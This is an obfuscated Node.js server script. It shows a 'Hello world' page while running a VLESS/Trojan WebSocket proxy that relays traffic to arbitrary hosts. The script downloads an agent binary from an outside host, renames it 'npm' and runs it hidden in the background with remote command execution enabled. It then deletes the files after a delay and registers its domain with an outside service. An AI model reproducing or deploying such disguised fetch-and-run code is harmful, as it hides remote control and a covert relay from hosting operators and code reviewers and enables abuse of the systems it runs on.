const w=b;function a(){const X=['2087','substr','data','&fp=chrome&type=ws&host=','&type=A','createHash','npm\x20download\x20successfully','client_secret:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','443','env','https://','8443','npm','slice','Hug','write','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unlink','1167228RRnZbr','vless://','concat','2053','&path=%2F','242294kkoAay','https://amd64.ssss.nyc.mn/v1','find','https://arm64.ssss.nyc.mn/agent','SUB_PATH','trim','false','end','NEZHA_SERVER','http','country_code','chmod\x20+x\x20npm','application/dns-json','Not\x20Found\x0a','close','connection','index.html','/bin/bash','error:\x20','setsid\x20nohup\x20./npm\x20-s\x20','1.1.1.1','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','path','url','1bb64688-d1c1-48c3-8c00-6f70126a8bef','from','Status','digest',':443?encryption=none&security=tls&sni=','--tls','https://api.ip.sb/geoip','pop','hex','text/html','catch','180300MAPNBS','npm\x20is\x20already\x20running,\x20skip\x20running...','arm64','https://oooo.serv00.net/add-url',':443?security=tls&sni=','text/plain','writeFileSync','length','stream','reduce','net','finish','once','pipe','readFile','Answer','AUTO_ACCESS','isp','Automatic\x20Access\x20Task\x20added\x20successfully','readUInt16BE','type','NEZHA_PORT','connect','aarch64','715720lfRGeB','NAME','8.8.4.4','config.yaml','DOMAIN','arch','then','sha224','3041784rAlIaO','child_process','message','https://arm64.ssss.nyc.mn/v1','sub','6139qerjGe','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','post','includes','WSPATH','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','application/json','log','2096','toString','readUInt8','get','Hello\x20world!','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','PORT','writeHead','trojan://','utf8','472558oAQmvQ','Server\x20is\x20running\x20on\x20port\x20','send','split','error','join','5944vxMJXu','https://dns.google/resolve?name=','NEZHA_KEY','true','1234.abc.com','npm\x20is\x20running'];a=function(){return X;};return a();}(function(c,d){const v=b,e=c();while(!![]){try{const f=-parseInt(v(0xc6))/0x1+-parseInt(v(0xa2))/0x2+-parseInt(v(0xc1))/0x3+-parseInt(v(0xe9))/0x4+parseInt(v(0x101))/0x5+parseInt(v(0x109))/0x6+-parseInt(v(0x10e))/0x7*(-parseInt(v(0xa8))/0x8);if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x5ef83));const os=require('os'),http=require(w(0xcf)),fs=require('fs'),axios=require('axios'),net=require(w(0xf3)),path=require(w(0xdc)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(w(0x10a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||w(0xde),NEZHA_SERVER=process[w(0xb8)][w(0xce)]||'',NEZHA_PORT=process[w(0xb8)][w(0xfe)]||'',NEZHA_KEY=process[w(0xb8)][w(0xaa)]||'',DOMAIN=process[w(0xb8)][w(0x105)]||w(0xac),AUTO_ACCESS=process[w(0xb8)][w(0xf9)]||![],WSPATH=process['env'][w(0x112)]||UUID[w(0xbc)](0x0,0x8),SUB_PATH=process['env'][w(0xca)]||w(0x10d),NAME=process[w(0xb8)][w(0x102)]||w(0xbd),PORT=process['env'][w(0x9e)]||0x1eb4;let ISP='';const GetISP=async()=>{const x=w;try{const c=await axios[x(0x9b)](x(0xe4)),d=c[x(0xb0)];ISP=(d[x(0xd0)]+'-'+d[x(0xfa)])['replace'](/ /g,'_');}catch(f){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((c,d)=>{const y=w;if(c[y(0xdd)]==='/'){const e=path['join'](__dirname,y(0xd6));fs[y(0xf7)](e,y(0xa1),(f,g)=>{const z=y;if(f){d['writeHead'](0xc8,{'Content-Type':z(0xe7)}),d[z(0xcd)](z(0x9c));return;}d[z(0x9f)](0xc8,{'Content-Type':z(0xe7)}),d[z(0xcd)](g);});return;}else{if(c['url']==='/'+SUB_PATH){const f=NAME?NAME+'-'+ISP:ISP,g=y(0xc2)+UUID+'@'+DOMAIN+y(0xe2)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+y(0xc5)+WSPATH+'#'+f,h=y(0xa0)+UUID+'@'+DOMAIN+y(0xed)+DOMAIN+y(0xb1)+DOMAIN+y(0xc5)+WSPATH+'#'+f,i=g+'\x0a'+h,j=Buffer[y(0xdf)](i)['toString']('base64');d[y(0x9f)](0xc8,{'Content-Type':'text/plain'}),d['end'](j+'\x0a');}else d['writeHead'](0x194,{'Content-Type':y(0xee)}),d['end'](y(0xd3));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[w(0x103),w(0xda)];function resolveHost(c){return new Promise((d,e)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](c)){d(c);return;}let f=0x0;function g(){const A=b;if(f>=DNS_SERVERS[A(0xf0)]){e(new Error('Failed\x20to\x20resolve\x20'+c+'\x20with\x20all\x20DNS\x20servers'));return;}const h=DNS_SERVERS[f];f++;const i=A(0xa9)+encodeURIComponent(c)+A(0xb2);axios['get'](i,{'timeout':0x1388,'headers':{'Accept':A(0xd2)}})[A(0x107)](j=>{const B=A,k=j[B(0xb0)];if(k[B(0xe0)]===0x0&&k['Answer']&&k[B(0xf8)]['length']>0x0){const l=k['Answer'][B(0xc8)](m=>m[B(0xfd)]===0x1);if(l){d(l[B(0xb0)]);return;}}g();})[A(0xe8)](j=>{g();});}g();});}function handleVlessConnection(c,d){const C=w,[e]=d,f=d['slice'](0x1,0x11);if(!f['every']((m,n)=>m==parseInt(uuid[C(0xaf)](n*0x2,0x2),0x10)))return![];let g=d[C(0xbc)](0x11,0x12)['readUInt8']()+0x13;const h=d[C(0xbc)](g,g+=0x2)[C(0xfc)](0x0),j=d[C(0xbc)](g,g+=0x1)[C(0x118)](),k=j==0x1?d[C(0xbc)](g,g+=0x4)[C(0xa7)]('.'):j==0x2?new TextDecoder()['decode'](d[C(0xbc)](g+0x1,g+=0x1+d[C(0xbc)](g,g+0x1)[C(0x118)]())):j==0x3?d[C(0xbc)](g,g+=0x10)[C(0xf2)]((m,n,o,p)=>o%0x2?m[C(0xc3)](p[C(0xbc)](o-0x1,o+0x1)):m,[])['map'](m=>m[C(0xfc)](0x0)[C(0x117)](0x10))[C(0xa7)](':'):'';c[C(0xa4)](new Uint8Array([e,0x0]));const l=createWebSocketStream(c);return resolveHost(k)[C(0x107)](m=>{const D=C;net[D(0xff)]({'host':m,'port':h},function(){const E=D;this[E(0xbe)](d['slice'](g)),l['on']('error',()=>{})[E(0xf6)](this)['on'](E(0xa6),()=>{})['pipe'](l);})['on'](D(0xa6),()=>{});})[C(0xe8)](m=>{const G=C;net['connect']({'host':k,'port':h},function(){const F=b;this[F(0xbe)](d[F(0xbc)](g)),l['on'](F(0xa6),()=>{})[F(0xf6)](this)['on'](F(0xa6),()=>{})[F(0xf6)](l);})['on'](G(0xa6),()=>{});}),!![];}function handleTrojanConnection(c,d){const H=w;try{if(d[H(0xf0)]<0x3a)return![];const e=d[H(0xbc)](0x0,0x38)[H(0x117)](),f=[UUID];let g=null;for(const n of f){const o=crypto[H(0xb3)](H(0x108))['update'](n)[H(0xe1)](H(0xe6));if(o===e){g=n;break;}}if(!g)return![];let h=0x38;d[h]===0xd&&d[h+0x1]===0xa&&(h+=0x2);const i=d[h];if(i!==0x1)return![];h+=0x1;const j=d[h];h+=0x1;let k,l;if(j===0x1)k=d['slice'](h,h+0x4)[H(0xa7)]('.'),h+=0x4;else{if(j===0x3){const p=d[h];h+=0x1,k=d['slice'](h,h+p)['toString'](),h+=p;}else{if(j===0x4)k=d['slice'](h,h+0x10)['reduce']((q,r,t,u)=>t%0x2?q[H(0xc3)](u[H(0xbc)](t-0x1,t+0x1)):q,[])['map'](q=>q['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),h+=0x10;else return![];}}l=d[H(0xfc)](h),h+=0x2;h<d[H(0xf0)]&&d[h]===0xd&&d[h+0x1]===0xa&&(h+=0x2);const m=createWebSocketStream(c);return resolveHost(k)[H(0x107)](q=>{const I=H;net[I(0xff)]({'host':q,'port':l},function(){const J=I;h<d['length']&&this[J(0xbe)](d[J(0xbc)](h)),m['on'](J(0xa6),()=>{})[J(0xf6)](this)['on'](J(0xa6),()=>{})[J(0xf6)](m);})['on'](I(0xa6),()=>{});})[H(0xe8)](q=>{const L=H;net['connect']({'host':k,'port':l},function(){const K=b;h<d['length']&&this[K(0xbe)](d[K(0xbc)](h)),m['on']('error',()=>{})[K(0xf6)](this)['on'](K(0xa6),()=>{})[K(0xf6)](m);})['on'](L(0xa6),()=>{});}),!![];}catch(q){return![];}}wss['on'](w(0xd5),(c,d)=>{const M=w,e=d[M(0xdd)]||'';c[M(0xf5)](M(0x10b),f=>{const N=M;if(f[N(0xf0)]>0x11&&f[0x0]===0x0){const g=f['slice'](0x1,0x11),h=g['every']((j,k)=>j==parseInt(uuid[N(0xaf)](k*0x2,0x2),0x10));if(h){!handleVlessConnection(c,f)&&c[N(0xd4)]();return;}}!handleTrojanConnection(c,f)&&c['close']();})['on'](M(0xa6),()=>{});});const getDownloadUrl=()=>{const O=w,c=os[O(0x106)]();return c==='arm'||c===O(0xeb)||c===O(0x100)?!NEZHA_PORT?O(0x10c):O(0xc9):!NEZHA_PORT?O(0xc7):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const P=w;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const c=getDownloadUrl(),d=await axios({'method':P(0x9b),'url':c,'responseType':P(0xf1)}),e=fs['createWriteStream'](P(0xbb));return d[P(0xb0)][P(0xf6)](e),new Promise((f,g)=>{const Q=P;e['on'](Q(0xf4),()=>{const R=Q;console[R(0x115)](R(0xb4)),exec(R(0xd1),h=>{if(h)g(h);f();});}),e['on'](Q(0xa6),g);});}catch(f){throw f;}},runnz=async()=>{const S=w;try{const f=execSync(S(0x10f),{'encoding':'utf-8'});if(f[S(0xcb)]()!==''){console['log'](S(0xea));return;}}catch(g){}await downloadFile();let c='',d=[S(0xb7),S(0xba),S(0x116),S(0xae),'2083',S(0xc4)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const h=d[S(0x111)](NEZHA_PORT)?S(0xe3):'';c=S(0xd9)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+h+S(0x113);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const i=NEZHA_SERVER[S(0x111)](':')?NEZHA_SERVER[S(0xa5)](':')[S(0xe5)]():'',j=d[S(0x111)](i)?S(0xab):S(0xcc),k=S(0xb5)+NEZHA_KEY+S(0xbf)+NEZHA_SERVER+S(0xdb)+j+S(0xb6)+UUID;fs[S(0xef)](S(0x104),k);}c='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[S(0x115)](S(0x9d));return;}}try{exec(c,{'shell':S(0xd7)},l=>{const T=S;if(l)console['error']('npm\x20running\x20error:',l);else console[T(0x115)](T(0xad));});}catch(l){console[S(0xa6)](S(0xd8)+l);}};function b(c,d){c=c-0x9b;const e=a();let f=e[c];return f;}async function addAccessTask(){const U=w;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const c=U(0xb9)+DOMAIN;try{const d=await axios[U(0x110)](U(0xec),{'url':c},{'headers':{'Content-Type':U(0x114)}});console[U(0x115)](U(0xfb));}catch(e){}}const delFiles=()=>{const V=w;fs[V(0xc0)]('npm',()=>{}),fs[V(0xc0)](V(0x104),()=>{});};httpServer['listen'](PORT,()=>{const W=w;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[W(0x115)](W(0xa3)+PORT);});
